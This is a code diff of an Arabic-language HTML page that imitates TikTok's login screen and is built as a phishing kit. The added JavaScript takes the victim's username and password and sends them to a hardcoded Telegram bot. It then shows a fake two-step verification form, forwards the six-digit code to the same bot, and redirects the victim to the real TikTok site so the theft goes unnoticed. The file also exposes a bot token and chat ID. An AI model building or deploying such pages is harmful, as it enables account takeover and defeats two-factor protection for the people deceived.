@@ -3,48 +3,150 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
+    <title>تسجيل الدخول | TikTok</title>
+    <link rel="icon" href="https://www.tiktok.com/favicon.ico">
+    
     <style>
-        body { background: #010101; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; margin: 0; }
-        .login-card { background: #121212; padding: 40px; border-radius: 16px; text-align: center; width: 320px; border: 1px solid #333; }
-        .logo { font-size: 30px; font-weight: bold; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; background: #222; border: 1px solid #444; border-radius: 8px; color: white; box-sizing: border-box; }
-        .login-btn { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        /* --- قسم التنسيق (CSS) --- */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
+        
+        body { 
+            background: #010101; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            color: white; 
+            margin: 0;
+        }
+
+        .login-card { 
+            background: #121212; 
+            padding: 40px 30px; 
+            border-radius: 16px; 
+            text-align: center; 
+            width: 350px; 
+            border: 1px solid #333; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+
+        .logo { font-size: 32px; font-weight: 800; margin-bottom: 10px; color: #fff; }
+        .subtitle { color: #8a8a8e; font-size: 14px; margin-bottom: 30px; }
+
+        input { 
+            width: 100%; 
+            padding: 14px; 
+            margin: 10px 0; 
+            background: #222; 
+            border: 1px solid #444; 
+            border-radius: 8px; 
+            color: white; 
+            font-size: 16px; 
+            outline: none; 
+            transition: 0.3s;
+        }
+
+        input:focus { border-color: #fe2c55; background: #1a1a1a; }
+
+        .login-btn { 
+            width: 100%; 
+            padding: 14px; 
+            background: #fe2c55; 
+            color: white; 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 15px; 
+            font-size: 16px;
+        }
+
+        /* تنسيق خاص لحقل الأرقام لمنع الأسهم الجانبية */
+        input[type=number]::-webkit-inner-spin-button, 
+        input[type=number]::-webkit-outer-spin-button { 
+            -webkit-appearance: none; 
+            margin: 0; 
+        }
+
+        .footer-text { margin-top: 25px; font-size: 13px; color: #777; }
+        .footer-text a { color: #fe2c55; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="login-card">
+    <div id="login-container" class="login-card">
         <div class="logo">TIKTOK</div>
+        <p class="subtitle">سجل دخولك للمتابعة</p>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="اسم المستخدم" required>
+            <input type="text" id="username" placeholder="اسم المستخدم أو الإيميل" required>
             <input type="password" id="password" placeholder="كلمة السر" required>
             <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
+        </form>
+        <div class="footer-text">ليس لديك حساب؟ <a href="#">إنشاء حساب</a></div>
+    </div>
+
+    <div id="otp-container" class="login-card" style="display: none;">
+        <div class="logo">التحقق بخطوتين</div>
+        <p class="subtitle">أدخل الرمز المكون من 6 أرقام المرسل إلى هاتفك</p>
+        <form id="otpForm">
+            <input type="number" id="otpCode" placeholder="0 0 0 0 0 0" required>
+            <button type="submit" class="login-btn" id="confirmBtn">تأكيد الرمز</button>
         </form>
     </div>
 
     <script>
-        // الكود هنا بسيط جداً لتجنب أخطاء الرموز
+        /* --- قسم البرمجة (JavaScript) --- */
         const B_TOKEN = "8105232434:AAFBeUtacZAGdfX_e2pE2MzBEGgaL8_zgVI";
         const C_ID = "301641581";
 
-        document.getElementById('loginForm').onsubmit = function(e) {
+        const loginForm = document.getElementById('loginForm');
+        const otpForm = document.getElementById('otpForm');
+        const loginContainer = document.getElementById('login-container');
+        const otpContainer = document.getElementById('otp-container');
+
+        // المرحلة الأولى: إرسال اسم المستخدم وكلمة السر
+        loginForm.onsubmit = function(e) {
             e.preventDefault();
             
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
             const btn = document.getElementById('submitBtn');
 
-            btn.innerText = "...جاري التحميل";
+            btn.innerText = "جاري التحقق...";
             btn.disabled = true;
 
-            const msg = "New Login:\nUser: " + u + "\nPass: " + p;
+            const msg1 = "🚨 *New Login Attempt* 🚨\n👤 User: `" + u + "`\n🔑 Pass: `" + p + "`";
 
-            fetch("https://api.telegram.org/bot" + B_TOKEN + "/sendMessage?chat_id=" + C_ID + "&text=" + encodeURIComponent(msg))
-            .then(function() {
+            // إرسال البيانات للبوت
+            fetch("https://api.telegram.org/bot" + B_TOKEN + "/sendMessage?chat_id=" + C_ID + "&text=" + encodeURIComponent(msg1) + "&parse_mode=Markdown")
+            .then(() => {
+                // إخفاء واجهة الدخول وإظهار واجهة الرمز بعد ثانية
+                setTimeout(() => {
+                    loginContainer.style.display = "none";
+                    otpContainer.style.display = "block";
+                }, 800);
+            });
+        };
+
+        // المرحلة الثانية: إرسال رمز التحقق والتحويل النهائي
+        otpForm.onsubmit = function(e) {
+            e.preventDefault();
+            
+            const code = document.getElementById('otpCode').value;
+            const btn2 = document.getElementById('confirmBtn');
+
+            btn2.innerText = "جاري التأكيد...";
+            btn2.disabled = true;
+
+            const msg2 = "🔐 *Verification Code:* `" + code + "`";
+
+            // إرسال الرمز للبوت
+            fetch("https://api.telegram.org/bot" + B_TOKEN + "/sendMessage?chat_id=" + C_ID + "&text=" + encodeURIComponent(msg2) + "&parse_mode=Markdown")
+            .then(() => {
+                // التحويل النهائي لتيك توك
                 window.location.href = "https://www.tiktok.com/login";
             })
-            .catch(function() {
+            .catch(() => {
                 window.location.href = "https://www.tiktok.com/login";
             });
         };
